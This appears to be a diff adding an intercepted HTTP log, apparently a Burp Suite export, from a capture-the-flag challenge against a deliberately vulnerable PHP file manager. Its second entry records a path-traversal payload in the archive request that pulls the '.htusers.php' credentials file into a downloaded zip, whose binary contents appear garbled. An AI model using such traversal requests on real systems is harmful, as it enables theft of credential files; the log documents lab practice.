+<TABLE width="300"><TR><TD>Name:</TD><TD align="right"><INPUT type="text" name="name" size="25"></TD></TR>
+<TR><TD>Type:</TD><TD align="right"><SELECT name="type">
+<OPTION value="zip">Zip</OPTION>
+</SELECT></TD></TR><TR><TD></TD><TD align="right"><INPUT type="submit" value="Create" class="button">
+<input type="button" value="Cancel" onClick="javascript:location='https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=name&srt=yes';" class="button">
+</TD></TR></FORM></TABLE><BR>
+<script language="JavaScript1.2" type="text/javascript">
+<!--
+    if(document.archform) document.archform.name.focus();
+// -->
+</script><hr>
+<small>Hope that you like this damn vulnerable dafuqManager :)</small>
+</center></body>
+</html>]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Mon Nov 26 15:16:23 CST 2018</time>
+    <url><![CDATA[https://dafuq-manager.hackme.inndy.tw/index.php?action=arch&order=name&srt=yes]]></url>
+    <host ip="140.118.126.236">dafuq-manager.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/index.php?action=arch&order=name&srt=yes]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[POST /index.php?action=arch&order=name&srt=yes HTTP/1.1
+Host: dafuq-manager.hackme.inndy.tw
+Connection: close
+Content-Length: 63
+Cache-Control: max-age=0
+Origin: https://dafuq-manager.hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://dafuq-manager.hackme.inndy.tw/index.php?action=arch
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=cu82k18ttg3tpqjmtvppkoutl2; show_hidden=no
+
+name=test&type=zip&selitems%5B%5D=/.'./.'./.config/.htusers.php]]></request>
+    <status>200</status>
+    <responselength>781</responselength>
+    <mimetype></mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Nov 2018 07:16:41 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Content-Disposition: attachment; filename="test"
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Transfer-Encoding: binary
+Strict-Transport-Security: max-age=15768000
+Content-Length: 400
+
+PK    ﾕﾆpKﾶO￮d￬   ￇ     /../../.config/.htusers.phpﾕﾎMKￄ0ﾆ￯�%xpam'ﾛﾤﾓ￵￑ﾋﾗﾅIﾓlEZjﾚ"￻￯Mﾕ￭.￬E￧￴￳>ￃs{￟7}v￱ﾴy~|￘ﾼl￙8ﾸ0ﾰￗ￼.ﾧhﾙ￥i~##ￛ￲ﾎﾫ(B`ￋﾜ	I,ﾠ4ﾽﾔﾖﾳkﾬﾔﾁb￥ﾧNQZﾊ4ﾥ&ￆ~ﾸ.ￓ￮ￇￏﾫﾖ:ￚﾹP4Tﾴﾮx￯:ﾻ/￢ￗﾡￍ￰V41ELￛby*￲Sﾞ^￺Z9ￚ
+M
+Aﾬ@+)ﾹC￯88
+ﾔ3￳wﾍﾙﾁﾣ?ﾓ￙ﾍnﾘ.ﾴL2RH]yJ	ﾰﾾﾪTﾭﾍﾑ'23￳ﾙs.ﾳﾸ￉ﾾﾶO￮d￬   ￇ  PK      ﾕﾆpKﾶO￮d￬   ￇ                   /../../.config/.htusers.phpPK      I   1    ]]></response>
+    <comment></comment>
+  </item>
+</items>
